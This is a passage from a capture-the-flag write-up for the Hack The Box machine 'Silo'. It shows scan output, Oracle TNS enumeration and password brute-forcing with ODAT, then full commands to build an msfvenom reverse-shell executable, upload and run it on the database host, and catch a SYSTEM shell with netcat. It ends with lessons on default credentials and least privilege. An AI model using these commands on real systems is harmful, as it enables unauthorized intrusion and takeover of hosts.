by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.82:80
[+] Threads:        30
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Show length:    true
[+] Extensions:     html,php
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2020/02/23 12:30:10 Starting gobuster
===============================================================
http://10.10.10.82:80/aspnet_client (Status: 301) [Size: 159]
===============================================================
2020/02/23 12:32:56 Finished
===============================================================Finished gobuster scan                                                                                                                                                                                                                                                                                                                     
=========================
                                                                                                                                                    
Starting gobuster scan
                                                                                                                                                    
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.82:5985
[+] Threads:        30
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Show length:    true
[+] Extensions:     html,php
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2020/02/23 12:48:56 Starting gobuster
===============================================================
===============================================================
2020/02/23 12:50:47 Finished
===============================================================Finished gobuster scan                                                                                                                       
=========================
                                                                                                                                                    
                                                                                                                                                    
Starting gobuster scan
                                                                                                                                                    
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.82:47001
[+] Threads:        30
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Show length:    true
[+] Extensions:     html,php
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2020/02/23 13:23:17 Starting gobuster
===============================================================
===============================================================
2020/02/23 13:25:25 Finished
===============================================================Finished gobuster scan
                                                                                                                                                    
                                                                                                                                                    
Starting smbmap scan
                                                                                                                                                    
[+] Finding open SMB ports....
[!] Authentication error on 10.10.10.82
[!] Authentication error on 10.10.10.82Finished smbmap scan
                                                                                                                                                    
=========================
                                                                                                                                                    
Starting smbclient scan
                                                                                                                                                    
session setup failed: NT_STATUS_ACCOUNT_DISABLEDFinished smbclient scan
                                                                                                                                                    
=========================
                                                                                                                                                    
Starting nmap scan
                                                                                                                                                    
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-23 13:38 EST
Nmap scan report for 10.10.10.82
Host is up (0.039s latency).PORT    STATE SERVICE
445/tcp open  microsoft-ds
|_clamav-exec: ERROR: Script execution failed (use -d to debug)Host script results:
|_samba-vuln-cve-2012-1182: No accounts left to try
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: No accounts left to tryNmap done: 1 IP address (1 host up) scanned in 24.20 secondsFinished nmap scan
                                                                                                                                                                                                                                                                                                                                                                                                                    
                                                                                                                                                    
---------------------Finished all Nmap scans---------------------Completed in 1 hour(s), 47 minute(s) and 6 second(s)
```

We have fifteen open ports.

* **Port 80:** running Microsoft-IIS/8.5
* **Ports 135, 49152, 49153, 49154, 49155,49158, 49161 & 49162:** running Microsoft Windows RPC
* **Ports 139 & 445:** running Samba
* **Ports 1521 & 4196:** running Oracle TNS listener
* **Ports 5985 & 47001:** running Microsoft HTTP API httpd 2.0

Before we move on to enumeration, let’s make some mental notes about the scan results.

* Port 80 is running a Microsoft IIS server. A quick google search tells us that the OS is probably Windows Server 2012 R2. The gobuster scan didn’t really find anything useful for this web server.
* The nmap scan reported a “_guest_” account for SMB, however, the smbclient scan reported an “_NT\_STATUS\_ACCOUNT\_DISABLED_” status, so I doubt we’ll be able to access any of the shares. We can check this manually.
* Ports 1521 & 4196 are running Oracle TNS listener. This is the database server software component that manages the network traffic between the Oracle Database and the client. If we manage to get access to this service with an account that has administrative privileges, we can potentially execute code on the box. The nmapAutomator script uses the Oracle Database Attacking Tool \(ODAT\) to enumerate the system ID and usernames/passwords. However, since the box kept crashing, I terminated the scan. We’ll do our own manual enumeration using this tool.

## Enumeration <a id="c516"></a>

If you don’t have ODAT installed on kali, the installation instructions can be found [here](https://github.com/quentinhardy/odat#installation-optional-for-development-version).

The first thing we need to enumerate is the Oracle System ID \(SID\) string. This is a string that is used to uniquely identify a particular database on a system. This can be done using the _sidguesser_ module in ODAT.

```text
python3 odat.py sidguesser -s 10.10.10.82 -p 1521
```

This takes a while, but it does find 4 valid SID strings.

```text
[+] SIDs found on the 10.10.10.82:1521 server: XE,XEXDB,SA,SB
```

We’ll use the first one: _XE_.

The second thing to do is enumerate valid credentials. This can be done using the _passwordguesser_ module in ODAT. I tried both account files that come with the ODAT installation, however, the tool didn’t find any valid credentials. So instead, let’s locate the credential list that the Metasploit framework uses.

```text
root@kali:~/Desktop/tools/odat# locate oracle_default_userpass.txt
/usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt
```

Copy it into the ODAT _accounts_ directory.

```text
root@kali:~/Desktop/tools/odat# cp /usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt accounts/
```

The username and passwords in this list are separated by a space instead of a forward slash \(/\). We’ll have to change it to forward slash so that the ODAT tool is able to parse the file. This can be done in vi using the following command.

```text
 :%s/ /\//g
```

Now that we have a proper list, we can use the _passwordguesser_ module to brute force credentials.

```text
python3 odat.py passwordguesser -s 10.10.10.82 -p 1521 -d XE --accounts-file accounts/oracle_default_userpass.txt
```

Again, this also takes a while but it ends up finding credentials!

```text
[+] Accounts found on 10.10.10.82:1521/XE: 
scott/tiger
```

If you look at the [Oracle documentation](https://docs.oracle.com/cd/B19306_01/install.102/b15660/rev_precon_db.htm), the username/password that we found are actually one of the default credentials used when setting up Oracle. Now that we have a valid SID and username/password, let’s see if we can get code execution on the box.

## Exploitation <a id="03d0"></a>

ODAT has a _utlfile_ module that allows you to upload, download or delete a file. Since we are trying to get code execution on the box, let’s upload a malicious executable that sends a reverse shell back to our attack machine.

First, generate the executable using msfvenom.

```text
msfvenom -p windows/x64/shell_reverse_tcp  LHOST=10.10.14.7 LPORT=1234 -f exe > shell.exe
```

Next, upload the file using the _utlfile_ module.

```text
python3 odat.py utlfile -s 10.10.10.82 -p 1521 -U "scott" -P "tiger" -d XE --putFile /temp shell.exe ../../htb/silo/shell.exe
```

We get the following error.

```text
[-] Impossible to put the ../../htb/silo/shell.exe file: `ORA-01031: insufficient privileges`
```

We don’t have sufficient privileges to upload a file. Let’s see if the user was given _sysdba_ privileges by adding the _sysdba_ flag to our command.

```text
python3 odat.py utlfile -s 10.10.10.82 -p 1521 -U "scott" -P "tiger" -d XE --putFile /temp shell.exe ../../htb/silo/shell.exe --sysdba
```

Now we need to execute the file. We can do that using the _externaltable_ module in ODAT.

First setup a listener on the attack machine to receive the reverse shell.

```text
nc -nlvp 1234
```

Next, execute the file using the following command.

```text
python3 odat.py externaltable -s 10.10.10.82 -p 1521 -U "scott" -P "tiger" -d XE --exec /temp shell.exe --sysdba
```

We get a shell!

![](https://miro.medium.com/max/834/1*M3cgHNR6Wur9aNX9TBwQjQ.png)

The database must have been running with SYSTEM privileges and so we got a shell as SYSTEM.

Grab the _user.txt_ flag.

![](https://miro.medium.com/max/614/1*rKfcd2xVS2Aqrw_p903Yzw.png)

Grab the _root.txt_ flag.

![](https://miro.medium.com/max/615/1*csWE8hku7mMusqOpJLROPg.png)

**Note:** IppSec has a [great video](https://www.youtube.com/watch?v=2c7SzNo9uoA) explaining how to do this manually without having to use ODAT or Metasploit. He also goes through the intended solution for the box which is much harder than the way I solved it.

## Lessons Learned <a id="a815"></a>

To get SYSTEM on this box, we exploited two vulnerabilities.

1. Use of Default Credentials. There was an exposed port that was running Oracle TNS listener. The administrator had used default credentials for a user that had sysdba \(privileged\) access. This allowed us to login as that user and execute malicious code on the box. Since default credentials are publicly available and can be easily obtained, the administrator should have instead used a sufficiently long password that is difficult to crack.
2. Least Privilege Violation. Oracle doesn’t need SYSTEM privileges to function properly. Instead it should have been run under a normal user account that has limited privileges. This way, even if we did get access to the box, we would have needed to find a way to escalate privileges, instead of immediately getting SYSTEM access without having to work for it. The administrator should have conformed to the principle of least privilege.

# -------------------------------FIN-------------------------------------
